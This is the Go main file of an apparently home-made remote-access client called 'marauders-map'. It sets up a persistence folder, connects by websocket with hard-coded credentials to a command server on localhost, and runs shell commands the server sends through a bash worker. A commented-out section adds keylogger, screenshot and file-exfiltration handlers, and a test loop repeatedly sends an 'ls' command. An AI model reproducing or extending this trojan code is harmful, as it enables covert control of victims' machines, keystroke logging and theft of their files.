package main

import (
	"marauders-map-client-desktop/internal"
	"time"
)

func main() {

	// Deploy for persistence
	// this setups home directory folder for the program
	// folder strcuture & persist mechanism
	watchtower := internal.Deploy()
	_ = watchtower

	// Creates WSClient configurations
	wscconf := internal.NewWSConfiguration("ws", "localhost", "8080", "/accesspoint")

	// Creates WSClient
	wsc := internal.NewWSClient(wscconf)
	wsc.SetCredentials("apal7", "pass")
	wsc.Connect()
	defer wsc.Disconnect()

	// Workers services
	bashWorker := internal.NewBashWorker(wsc)
	bashWorker.Start()

	// Creates subcriptions
	var subs []*internal.Subscription
	subs = append(subs, internal.NewSubscription("/temp-queue/queue/marauder/bash/req", bashWorker))

	wsc.SetupSubscriptions(subs)

	go func() {
		for {
			time.Sleep(3 * time.Second)
			wsc.Send("/app/marauder/bash/req", []byte("{\"marauder_id\":\"123\", \"command\":\"ls\"}"))
		}
	}()

	for {
	}

	// // Initialize Observer for processing incoming
	// // commands from server
	// screenrecorder := internal.NewScreenRecorder(5)
	// sendFileCmd := internal.NewSendFileCommand(wsc)
	// respondServerCmd := internal.NewRespondServerCommand(wsc)

	// subject := &internal.Subject{}
	// subject.AddListener(internal.NewBashExecutorObserver(respondServerCmd))
	// subject.AddListener(internal.NewKeyloggerCmdObserver())
	// subject.AddListener(internal.NewScreenshotCmdObserver(screenrecorder, sendFileCmd, respondServerCmd))
	// subject.AddListener(internal.NewFileCmdObserver(sendFileCmd, watchtower, respondServerCmd))

	// // Start Communications
	// wsc.StartCommunications(subject)

}
